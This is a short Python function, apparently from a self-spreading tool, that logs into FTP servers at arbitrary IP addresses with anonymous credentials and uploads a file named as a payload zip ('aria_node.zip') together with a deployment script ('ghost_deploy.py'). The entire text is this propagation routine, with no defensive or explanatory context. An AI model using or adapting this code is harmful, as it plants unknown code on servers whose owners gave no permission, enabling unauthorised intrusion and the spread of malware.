from ftplib import FTP

def try_ftp_upload(ip, payload_zip, deploy_script):
    try:
        ftp = FTP(ip, timeout=5)
        ftp.login()  # anonymous
        with open(payload_zip, "rb") as fz:
            ftp.storbinary("STOR aria_node.zip", fz)
        with open(deploy_script, "rb") as fs:
            ftp.storbinary("STOR ghost_deploy.py", fs)
        print(f"[✓] FTP upload success: {ip}")
        return True
    except Exception as e:
        print(f"[!] FTP upload failed: {ip} - {e}")
        return False
